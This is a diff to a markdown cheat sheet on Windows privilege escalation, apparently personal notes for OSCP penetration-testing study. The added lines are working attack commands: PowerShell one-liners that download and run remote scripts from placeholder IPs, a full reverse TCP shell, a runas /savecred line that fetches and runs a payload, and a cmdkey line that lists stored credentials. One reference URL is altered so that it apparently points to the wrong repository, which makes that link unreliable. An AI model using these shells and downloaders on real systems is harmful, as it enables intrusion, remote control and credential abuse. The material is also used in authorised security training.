@@ -9,7 +9,7 @@ https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.htm
 https://github.com/AonCyberLabs/Windows-Exploit-Suggester  
 https://book.hacktricks.xyz/windows/windows-local-privilege-escalation  
 https://github.com/frizb/Windows-Privilege-Escalation  
-https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc  
+https://github.com/Mafia/PowerSploit/tree/master/Privesc  
 https://oscp.securable.nl/privilege-escalation  
 http://www.fuzzysecurity.com/tutorials/16.html  
 https://0xbam.blogspot.com/2019/04/oscp-methodology.html  
@@ -34,6 +34,8 @@ More information Regarding Windows-Privesc-Check please refer to: https://github
 ### [Check current priv]
 ```
 whoami /priv
+whoami /all
+cmdkey /list
 ```
 
 ### [Check hotfixes]
@@ -205,6 +207,12 @@ powershell IWR -Uri http[:]//myip/filename.exe -OutFile filename.exe
 powershell "(new-object System.Net.WebClient).Downloadfile('http[:]//10.10.14.15:8000/revshell.exe', 'revshell.exe')"
 powershell.exe "IEX(New-Object Net.WebClient).downloadString(‘http://<IP_ADDRESS>/Invoke-PowerShellTcp.ps1')"
 powershell.exe "IEX(New-Object Net.WebClient).downloadString(‘http://<IP_ADDRESS>/Sherlock.ps1'); Find-AllVulns"
+START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://your_IP/shell.ps1')
+```
+
+### Nishang Powershell reverse_TCP
+```
+powershell -nop "$sm=(New-Object Net.Sockets.TCPClient('<IP>',<PORT>)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
 ```
 
 ### [netcat for windows]
@@ -849,3 +857,9 @@ Exploit suggester using particular OS without suggested hotfixes
 ```
 ./windows-exploit-suggester.py --database exploit_database.xlsx --ostext 'windows server 2008 r2' 
 ```
+
+### running a program as a different user using runas
+```
+runas /user:<DOMAIN>\<USER> /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<IP>/shell.ps1')"
+```
+
